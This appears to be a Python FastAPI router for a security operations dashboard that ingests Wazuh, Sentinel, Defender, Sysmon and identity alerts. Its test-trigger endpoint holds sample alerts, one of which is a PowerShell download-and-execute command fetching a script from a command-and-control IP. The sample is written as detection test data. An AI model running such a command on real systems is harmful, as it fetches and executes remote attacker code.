from fastapi import APIRouter, BackgroundTasks, HTTPException, Body
from pydantic import BaseModel
from typing import Dict, Any, List, Optional
import datetime

from app.integrations.wazuh_connector import wazuh_connector
from app.integrations.microsoft_security_connector import microsoft_connector
from app.integrations.sysmon_connector import sysmon_connector
from app.integrations.iam_connector import iam_connector
from app.api.routes_alerts import create_alert, AlertPayload
from app.api.websocket_manager import ws_manager

router = APIRouter(prefix="/api/integrations", tags=["integrations"])

class IAMActionRequest(BaseModel):
    user_principal_name: str
    action: str # "revoke_sessions" or "disable_account"
    provider: Optional[str] = "Microsoft Entra ID"

class TestIntegrationRequest(BaseModel):
    connector: str # "wazuh", "sentinel", "defender", "sysmon", "iam", "grafana"

@router.get("/status")
def get_integrations_status() -> Dict[str, Any]:
    return {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "connectors": [
            {
                "id": "wazuh",
                "name": "Wazuh SIEM & HIDS",
                "category": "SIEM / Host Security",
                "status": "CONNECTED",
                "webhook_url": "/api/integrations/wazuh/webhook",
                "description": "Receives host intrusion alerts, FIM violations and syslog from Wazuh 4.14 agents."
            },
            {
                "id": "microsoft_sentinel",
                "name": "Microsoft Sentinel (Cloud SIEM)",
                "category": "Cloud SIEM / SOAR",
                "status": "ACTIVE",
                "webhook_url": "/api/integrations/microsoft/sentinel",
                "description": "Azure cloud incidents, Microsoft Graph security alerts and Entra ID telemetry."
            },
            {
                "id": "microsoft_defender",
                "name": "Microsoft Defender for Endpoint (MDE/XDR)",
                "category": "EDR / XDR",
                "status": "ACTIVE",
                "webhook_url": "/api/integrations/microsoft/defender",
                "description": "Endpoint detections, process trees, and automated machine isolation playbooks."
            },
            {
                "id": "sysmon",
                "name": "Windows Sysmon & Winlogbeat",
                "category": "Endpoint Telemetry",
                "status": "READY",
                "webhook_url": "/api/integrations/sysmon/event",
                "description": "Process creation (Event ID 1), Network connections (ID 3), File tampering (ID 11)."
            },
            {
                "id": "iam_entra",
                "name": "Microsoft Entra ID & IAM Directory",
                "category": "Identity & Access Management",
                "status": "ENABLED",
                "webhook_url": "/api/integrations/iam/revoke",
                "description": "Automated user token revocation, account quarantine, and credential containment."
            },
            {
                "id": "grafana",
                "name": "Grafana Enterprise Telemetry",
                "category": "Dashboards & Analytics",
                "status": "CONFIGURED",
                "webhook_url": "/integrations/grafana/soc_dashboard.json",
                "description": "Live alert ingestion metrics, MITRE ATT&CK coverage charts, and executive reporting."
            }
        ]
    }

@router.post("/wazuh/webhook")
async def ingest_wazuh_alert(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = wazuh_connector.parse_wazuh_alert(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Wazuh SIEM", "result": result}

@router.post("/microsoft/sentinel")
async def ingest_sentinel_incident(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = microsoft_connector.parse_sentinel_incident(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Microsoft Sentinel", "result": result}

@router.post("/microsoft/defender")
async def ingest_defender_alert(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = microsoft_connector.parse_defender_alert(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Microsoft Defender XDR", "result": result}

@router.post("/sysmon/event")
async def ingest_sysmon_event(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = sysmon_connector.parse_sysmon_event(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Windows Sysmon", "result": result}

@router.post("/iam/action")
async def execute_iam_action(request: IAMActionRequest):
    if request.action == "revoke_sessions":
        res = iam_connector.revoke_user_sessions(request.user_principal_name, request.provider)
    else:
        res = iam_connector.disable_user_account(request.user_principal_name, request.provider)
        
    await ws_manager.broadcast("IAM_ACTION", res)
    return res

@router.post("/test-trigger")
async def test_integration_trigger(request: TestIntegrationRequest, background_tasks: BackgroundTasks):
    c = request.connector.lower()
    
    if c == "wazuh":
        sample = {
            "id": "wazuh-sample-01",
            "rule": {"id": "100001", "level": 12, "description": "Wazuh SIEM: SSH Brute Force correlation (25 attempts)", "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]}},
            "agent": {"name": "prod-auth-linux-01"},
            "data": {"srcip": "185.220.101.45", "dstip": "10.0.1.50"}
        }
        return await ingest_wazuh_alert(sample, background_tasks)
        
    elif c == "sentinel":
        sample = {
            "IncidentTitle": "Anomalous Cloud Privilege Escalation in Azure Subscription",
            "Severity": "High",
            "relatedEntities": [{"kind": "Ip", "properties": {"address": "161.118.212.147"}}]
        }
        return await ingest_sentinel_incident(sample, background_tasks)
        
    elif c == "defender":
        sample = {
            "title": "Malicious PowerShell Script Execution Detected (Mimikatz memory dump attempt)",
            "severity": "Critical",
            "computerDnsName": "FINANCE-WORKSTATION-09",
            "mitreTechniques": ["T1059.001", "T1003"],
            "evidence": [{"ipAddress": "45.143.200.12"}]
        }
        return await ingest_defender_alert(sample, background_tasks)
        
    elif c == "sysmon":
        sample = {
            "EventID": 1,
            "Computer": "DC-PRIMARY-CORP.local",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Nop -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/c2.ps1')",
            "DestinationIp": "185.220.101.45",
            "User": "NT AUTHORITY\\SYSTEM"
        }
        return await ingest_sysmon_event(sample, background_tasks)
        
    elif c == "iam":
        return await execute_iam_action(IAMActionRequest(
            user_principal_name="johndoe@empresa.com.br",
            action="revoke_sessions",
            provider="Microsoft Entra ID"
        ))
        
    raise HTTPException(status_code=400, detail="Invalid connector type")
